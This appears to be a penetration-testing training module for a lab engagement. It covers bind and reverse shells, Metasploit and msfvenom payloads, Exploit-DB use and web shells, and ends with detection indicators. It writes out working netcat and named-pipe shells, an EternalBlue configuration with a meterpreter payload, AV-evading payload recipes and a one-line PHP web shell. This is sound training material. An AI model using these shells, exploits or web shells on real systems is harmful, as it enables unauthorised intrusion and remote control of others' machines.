# CAT5 Security's Engagement Preparation

CAT5 Security's engagement preparation module evaluates penetration testers across core offensive skills before deployment on live client engagements such as the Inlanefreight assessment. The evaluation is structured as a sequential series of practical challenges covering shells, payloads, web shell deployment, and defensive detection -- each section must be completed to pass the assessment.

## Shell Basics

Shells form the foundation of post-exploitation access. Two connection models are assessed here: a bind shell, where the target opens a listening port and the operator connects to it; and a reverse shell, where the target calls back to an operator-controlled listener. Bind shells are limited by inbound firewall rules; reverse shells are preferred in most real environments because outbound traffic is rarely blocked.

### Bind Shell on Linux Host

The target listens on a port and exposes a shell process. Using **[Ncat](https://nmap.org/ncat/)**:

```bash
# On the target
nc -lvp 4444 -e /bin/bash

# On the operator machine
nc <TARGET_IP> 4444
```

Where the `-e` flag is unavailable, a named pipe achieves the same result:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f
```

### Reverse Shell on Windows Host

The target connects outbound to the operator's listener. **[Metasploit Framework's](https://www.metasploit.com/)** `exploit/multi/handler` is the standard receiver:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST <OPERATOR_IP>
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

A PowerShell one-liner can deliver the same result without dropping a binary to disk, which reduces detection surface on monitored Windows hosts.

## Payload Basics

Payloads are the executable components responsible for establishing access after exploitation. Metasploit Framework distinguishes between staged payloads (a lightweight stager fetches the full payload from the listener at runtime) and stageless payloads (fully self-contained). Staged payloads reduce initial binary size; stageless payloads remove the requirement for a continuous listener callback during delivery.

### Launching a Payload from MSF

Select a module, assign a payload, configure required options, and execute:

```bash
msf6 > search type:exploit platform:windows name:smb
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS <TARGET_IP>
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST <OPERATOR_IP>
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > run
```

### Searching and Building a Payload from ExploitDB

**[Exploit-DB](https://www.exploit-db.com/)** and its command-line companion **[searchsploit](https://www.exploit-db.com/searchsploit)** provide offline access to a curated PoC archive. Locate, inspect, and mirror an exploit as follows:

```bash
# Search by product and version
searchsploit apache 2.4.49

# View the full local path
searchsploit -p 50383

# Copy to current working directory for editing
searchsploit -m 50383
```

Raw PoC code requires adaptation before use -- update IP addresses, ports, and shell commands to match the engagement environment. Python 2 scripts may need minor syntax corrections for Python 3; C-based exploits must be compiled with the correct architecture flags.

### Payload Creation

**[msfvenom](https://www.metasploit.com/)** generates standalone payloads across multiple formats and supports encoding to reduce antivirus signature hits:

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```

Common combinations:

| Target | Payload | Format | Output |
|---|---|---|---|
| Windows x64 | `windows/x64/shell_reverse_tcp` | `-f exe` | `shell.exe` |
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | `-f exe` | `meter.exe` |
| Linux x64 | `linux/x64/shell_reverse_tcp` | `-f elf` | `shell.elf` |
| PHP web target | `php/reverse_php` | `-f raw` | `shell.php` |
| ASPX web target | `windows/x64/shell_reverse_tcp` | `-f aspx` | `shell.aspx` |

Encoding with `x86/shikata_ga_nai` adds a layer of obfuscation against static AV but does not reliably defeat behavioural detection -- it is a baseline technique rather than a robust evasion strategy.

## Getting a Shell on Windows

Using the provided recon results, identify the target service version, map it to an applicable MSF module or ExploitDB PoC, configure and deliver the payload, then confirm access with `whoami`, `systeminfo`, and `ipconfig`. Transfer a standalone msfvenom-generated executable via accessible services (SMB, HTTP, WinRM) where direct MSF module delivery is impractical.

## Getting a Shell on Linux

Parse recon output for service version strings and cross-reference against **[Exploit-DB](https://www.exploit-db.com/)** or available MSF modules. Deliver the payload, catch the shell on a Netcat listener, and immediately upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z -> stty raw -echo -> fg -> export TERM=xterm
```

Basic reverse shells received over Netcat lack job control and signal handling -- the TTY upgrade is required before further interactive enumeration.

## Landing a Web Shell

A web shell is a server-side script uploaded to the target web application that provides browser-accessible remote command execution. The scripting language must match the application stack identified during recon:

| Web Technology | Language | Extensions |
|---|---|---|
| Apache / Nginx (Linux) | PHP | `.php`, `.phtml` |
| IIS (Windows) | ASPX | `.aspx`, `.asp` |
| Apache Tomcat | JSP | `.jsp`, `.jspx` |
| WordPress / Joomla | PHP | `.php` |

A minimal PHP shell accepting commands via GET parameter:

```php
<?php system($_GET['cmd']); ?>
```

Issued as: `http://<TARGET_IP>/uploads/shell.php?cmd=id`

Deployment vectors include unrestricted file upload forms, application admin panels (e.g., WordPress Theme Editor, Tomcat Manager WAR upload), and RCE vulnerabilities that write files to the web root. **[Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)** shell collections are pre-installed on Kali Linux at `/usr/share/webshells/laudanum/` and cover PHP, ASPX, and JSP targets.

## Spotting a Shell or Payload

Detection requires analysis across multiple data sources. Key indicators:

- A shell process (`cmd.exe`, `powershell.exe`, `/bin/bash`) spawned as a child of a web server or database process -- this is the primary indicator of web shell activity.
- Unexpected listening ports visible in `netstat -tulnp` or `ss -tulnp` output bound to non-standard ports (bind shell indicator).
- Established outbound TCP connections from server processes to external IPs on ports such as 4444, 1234, or 9001.
- Script files (`.php`, `.aspx`, `.jsp`) present in web-accessible directories with recent timestamps inconsistent with legitimate deployments.
- Web server access logs containing URL-encoded command strings such as `cmd=whoami` or `cmd=id`.
- On Windows, Event ID **4688** (process creation) recording anomalous parent-child chains; on Linux, `auditd` entries logging unexpected shell spawning from non-interactive sessions.

## Final Challenge

The final challenge requires selecting, crafting, and deploying a payload against provided hosts -- one Windows, one Linux -- using the skills demonstrated across all preceding sections. Analyse the recon data first, identify the attack surface, select the appropriate exploit or payload, deliver it via the identified vector, and stabilise the shell. Enumerate the host for the requested artefacts and document each step precisely -- accurate operational logging during this challenge reflects the standard expected on the live Inlanefreight engagement.
